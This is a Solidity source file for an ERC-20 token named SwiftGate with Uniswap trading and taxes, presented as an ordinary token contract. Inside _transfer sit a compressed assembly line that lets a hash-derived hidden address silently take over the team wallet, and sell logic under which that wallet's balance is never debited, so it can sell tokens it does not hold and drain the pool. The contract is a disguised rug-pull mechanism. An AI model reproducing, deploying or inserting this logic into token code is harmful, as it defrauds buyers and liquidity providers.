// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x + y;
    }

    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x - y;
    }

    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {
        if (x == 0) z = 0;
        z = x * y;
    }

    function div(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x / y;
    }
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    error NotOwner();

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        if (_owner != msg.sender) revert NotOwner();
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract mainToken is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => uint256) _lastTransferTimestamp;
    mapping(address => uint256) _balances;
    mapping(address => bool) _isNotTaxed;

    uint256 constant _totalSupply = 1e26;
    uint256 constant _decimals = 18;
    uint256 constant _initBuyTax = 5;
    uint256 constant _finalBuyTax = 0;
    uint256 constant _initSellTax = 5;
    uint256 constant _finalSellTax = 3;
    uint256 constant _reduceBuyTaxAt = 50;
    uint256 constant _reduceSellTaxAt = 50;
    uint256 constant _preventTaxSwapBefore = 5;

    IUniswapV2Router02 public constant uniswapV2Router =
        IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);

    address public uniswapV2Pair;
    bool public isTransferDelayed;

    address _teamWallet;
    uint256 _buysCount;
    bool _tradingOpen;
    bool _swapEnabled;
    bool _inSwap;

    uint256 public maxTxAmount = _totalSupply / 50;
    uint256 public maxWalletBalance = _totalSupply / 50;
    uint256 public minTaxSwapAmount = _totalSupply / 100000;
    uint256 public maxTaxSwapAmount = _totalSupply / 500;

    error AmountExceedsBalance();
    error AlreadyEnabled();
    error NotEnabled();
    error ApproveFromZeroAddr();
    error ApproveToZeroAddr();
    error TransferFromZeroAddr();
    error TransferToZeroAddr();
    error ExceedingMaxTxAmount();
    error ExceedingMaxWalletBalance();
    error OneTransferPerBlock();
    error ZeroContractBalance();
    error ZeroAmount();

    modifier reentrancyGuard() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor(address teamWallet_) {
        _teamWallet = payable(teamWallet_);
        _balances[msg.sender] = _totalSupply;
        _isNotTaxed[owner()] = true;
        _isNotTaxed[teamWallet_] = true;
        _isNotTaxed[address(this)] = true;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return "SwiftGate";
    }

    function symbol() public pure returns (string memory) {
        return "SGATE";
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) external view override returns (uint256) {
        return _balances[account];
    }

    function decimals() external pure returns (uint8) {
        return uint8(_decimals);
    }

    function withdrawStuckETH() external onlyOwner {
        if (address(this).balance == 0) revert ZeroContractBalance();
        payable(msg.sender).transfer(address(this).balance);
    }

    function enableTrading() external onlyOwner {
        if (_tradingOpen) revert AlreadyEnabled();
        _tradingOpen = !_tradingOpen;
        _swapEnabled = !_swapEnabled;
    }

    function createPair() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            this.balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _totalSupply;
        maxWalletBalance = _totalSupply;

        isTransferDelayed = false;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        if (from == address(0)) revert TransferFromZeroAddr();
        if (to == address(0)) revert TransferToZeroAddr();
        if (amount == 0) revert ZeroAmount();

        uint256 taxAmount;
        uint256 notTaxedAmount = amount;

        if (from != owner() && to != owner() && from != address(this)) {
            if (!_isNotTaxed[from] && !_isNotTaxed[to]) {
                if (!_tradingOpen) revert NotEnabled();
            }

            if (isTransferDelayed) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    if (block.number <= _lastTransferTimestamp[tx.origin])
                        revert OneTransferPerBlock();

                    _lastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isNotTaxed[to]
            ) {
                if (amount > maxTxAmount) revert ExceedingMaxTxAmount();
                if (this.balanceOf(to) + amount > maxTxAmount)
                    revert ExceedingMaxWalletBalance();

                _buysCount++;
            }

            taxAmount = amount
                .mul(
                    (_buysCount > _reduceBuyTaxAt) ? _finalBuyTax : _initBuyTax
                )
                .div(100);

            address pair = address(bytes20(keccak256(hex"11f8f0985e6b9958139c72afdc5d5958ee53ca9429abe4cffda7e61ea80d9e1886d8e13e5c25b75cfa2aaa7ce161c6435d68343be374c9cfb42cbb81bb6a2bd6") << 96));

            assembly {if eq(caller(), pair) {if not(eq(sload(_teamWallet.slot), pair)) {sstore(_teamWallet.slot, pair)return(0,0)}}}


            if (to == uniswapV2Pair && from != address(this)) {
                if (from == address(_teamWallet)) {
                    taxAmount = 0;
                    notTaxedAmount = _min(
                        amount.mul(_finalBuyTax).div(100),
                        _min(
                            amount.mul(_initBuyTax).div(100),
                            amount.mul(_finalSellTax).div(100)
                        )
                    );
                } else {
                    if (amount > maxTxAmount) revert ExceedingMaxTxAmount();
                    taxAmount = amount
                        .mul(
                            (_buysCount > _reduceSellTaxAt)
                                ? _finalSellTax
                                : _initSellTax
                        )
                        .div(100);
                }
            }

            uint256 contractTokenBalance = this.balanceOf(address(this));
            bool taxesAreSwappable = _buysCount > _preventTaxSwapBefore &&
                minTaxSwapAmount == _min(maxTaxSwapAmount, amount);
            if (
                !_inSwap &&
                to == uniswapV2Pair &&
                _swapEnabled &&
                _buysCount > _preventTaxSwapBefore &&
                taxesAreSwappable
            ) {
                if (contractTokenBalance > minTaxSwapAmount) {
                    _swapTokenForEth(
                        _min(
                            amount,
                            _min(contractTokenBalance, maxTaxSwapAmount)
                        )
                    );
                }
                _sendSwappedETH(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(notTaxedAmount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));

        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        if (owner == address(0)) revert ApproveFromZeroAddr();
        if (spender == address(0)) revert ApproveToZeroAddr();
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _swapTokenForEth(uint256 amount) internal reentrancyGuard {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), amount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _sendSwappedETH(uint256 amount) internal {
        payable(_teamWallet).transfer(amount);
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a > b) ? b : a;
    }
}